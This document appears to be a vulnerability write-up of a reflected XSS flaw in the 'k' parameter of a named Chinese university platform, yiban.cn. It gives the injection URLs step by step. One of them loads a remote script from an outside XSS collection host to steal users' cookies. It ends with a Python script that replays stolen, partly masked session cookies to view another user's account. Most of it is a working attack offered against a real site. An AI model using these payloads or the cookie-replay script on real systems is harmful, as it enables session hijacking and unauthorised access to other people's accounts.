## There are reflective XSS vulnerabilities in the educational platform of Chinese colleges and universities, and the aggressive URL URL can be used to attract and steal the user cookie to realize the landing and other operations.Specific vulnerabilities are analyzed as follows  
First, the parameter k is extracted from an article, which mistaken the K to the front end for unfiltered use.
http://www.yiban.cn//project/haiyang_2015yxj/articlelist.php?k=%E3%80%90%E5%90%83%E3%80%919428
### 这时候我们尝试拼接该前端js的function
At this time we tried to splice the function of the front-end JS  
http://www.yiban.cn//project/haiyang_2015yxj/articlelist.php?k=%E3%80%90%E5%90%83%E3%80%919428';}
### Then we continue to splice the JS code. We see that it can be executed, that is, there is no filtering for k.
http://www.yiban.cn//project/haiyang_2015yxj/articlelist.php?k=%E3%80%90%E5%90%83%E3%80%919428';}</scRIPt><script>alert(1)</script>
## Ok,now we can splice up our malicious JS code (for testing purposes only), and then entice the user to click, so we can steal the cookies of the user.
http://www.yiban.cn//project/haiyang_2015yxj/articlelist.php?k=%E3%80%90%E5%90%83%E3%80%919428';}</scRIPt><script src=http://xsspt.com/8cwW2O?1527634980></script>
### Then we used the stolen cookie to login, obviously we succeeded.

### Vulnerability utilization test scripts are as follows
···
import requests

headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'}
cookie = {'YB_SSID':'-----------2bb1c78cb--d656', 'UM_distinctid':"-----a1240-\059a69ae-5b452a1d-e1000-163ae2270ee1a4", 'SL_GWPT_Show_Hide_tmp':'1', 'yiban_user_token':'3----4b6258ac85b38', 'CNZZDATA1253488264':'7----6-15631606-null%7C1527631606', '_cnzz_CV1253488264':'%-ndex%2FI-----%2Findex%7C1527635160910%26%E5%AD%A6%E6%A0%A1%E5%90%8D%E7%A7%B0%7C%E5%85%B6%E4%BB%96%7C1527635160910', 'SL_wptGlobTipTmp':'---1'}
res = requests.get(url='http://www.yiban.cn/user/index/index/user_id/8777259',cookies=cookie,headers=headers)
print(res.text)
···
